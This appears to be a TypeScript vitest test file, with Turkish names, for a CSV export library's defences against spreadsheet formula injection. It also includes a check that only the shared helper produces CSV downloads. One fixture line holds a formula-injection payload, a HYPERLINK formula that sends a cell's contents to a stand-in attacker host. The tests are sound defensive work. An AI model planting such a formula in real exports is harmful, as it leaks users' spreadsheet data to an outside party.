import { readFileSync } from "node:fs";
import { relative, resolve } from "node:path";

import { describe, expect, it } from "vitest";

import { bakimOzetCsv } from "@/lib/bakim-ozet-csv";
import { csvHucresi, csvMetni } from "@/lib/csv";

import { taranacakDosyalar } from "./tarama";

// (P248 §3c) CSV FORMUL ENJEKSIYONU — OWASP "CSV Injection".
const SALDIRI = '=HYPERLINK("http://kotu.example/?"&A1,"Tikla")';

describe("(P248 §3c) csvHucresi", () => {
  it("formul onekli metnin basina ' konur", () => {
    for (const onek of ["=", "+", "-", "@", "\t", "\r"]) {
      expect(csvHucresi(`${onek}1+1`).startsWith(`'${onek}`) ||
        csvHucresi(`${onek}1+1`).startsWith(`"'${onek}`)).toBe(true);
    }
    expect(csvHucresi(SALDIRI)).toBe(`"'=HYPERLINK(""http://kotu.example/?""&A1,""Tikla"")"`);
  });

  it("SAF SAYI dokunulmaz (tutar formul degildir)", () => {
    expect(csvHucresi("-12,50", ";")).toBe("-12,50");
    expect(csvHucresi("-12.50")).toBe("-12.50");
    expect(csvHucresi(-5)).toBe("-5");
    expect(csvHucresi("-5 TL")).toBe("'-5 TL");
  });

  it("ayrac/tirnak/satir sonu kacisi", () => {
    expect(csvHucresi("a,b")).toBe('"a,b"');
    expect(csvHucresi("a;b", ";")).toBe('"a;b"');
    expect(csvHucresi('x"y')).toBe('"x""y"');
    expect(csvHucresi("a\nb")).toBe('"a\nb"');
    expect(csvHucresi(null)).toBe("");
    expect(csvHucresi("Ali = Veli")).toBe("Ali = Veli");
  });

  it("csvMetni BOM + satirlar", () => {
    expect(csvMetni([["a", "=1"], ["b", "2"]])).toBe("﻿a,'=1\nb,2");
  });

  it("bakim ozeti: kotu ekipman adi formul olarak cikmaz", () => {
    const csv = bakimOzetCsv(
      {
        yil: 2026,
        satirlar: [{
          ad: SALDIRI, yasal: false, bakim_sayisi: 1, toplam_kurus: -1250,
          son_bakim: null, sonraki_bakim: "2026-10-01",
        }],
      },
      ["Ad", "Yasal", "Sayi", "Toplam", "Son", "Sonraki"],
      "Yasal",
    );
    const satir = csv.split("\n")[1];
    expect(satir.startsWith(`"'=HYPERLINK`)).toBe(true);
    expect(satir).toContain(";-12,50;");
  });
});

// KILIT: `text/csv` Blob'u YALNIZ `lib/csv.ts` uretir; baska bir dosya
// kendi CSV'sini kurup indirirse formul kacisini atlayabilir.
const KOK = resolve(__dirname, "..");

describe("(P248 §3c) CSV uretim kapisi kilidi", () => {
  it("text/csv Blob'u yalniz lib/csv.ts'te; CSV ureten dosya @/lib/csv kullanir", () => {
    const ihlal: string[] = [];
    for (const y of taranacakDosyalar(["app", "components", "lib"], [".ts", ".tsx"])) {
      const g = relative(KOK, y);
      if (g === "lib/csv.ts") continue;
      const s = readFileSync(y, "utf8");
      if (/new Blob\([^)]*text\/csv/s.test(s)) ihlal.push(`${g}: kendi text/csv Blob'u`);
      if (/\.csv[`"']/.test(s) && /\.download\s*=|csvMetniIndir|csvIndir/.test(s)
          && !s.includes('from "@/lib/csv"')) {
        ihlal.push(`${g}: CSV indiriyor ama @/lib/csv kullanmiyor`);
      }
    }
    expect(ihlal).toEqual([]);
  });
});
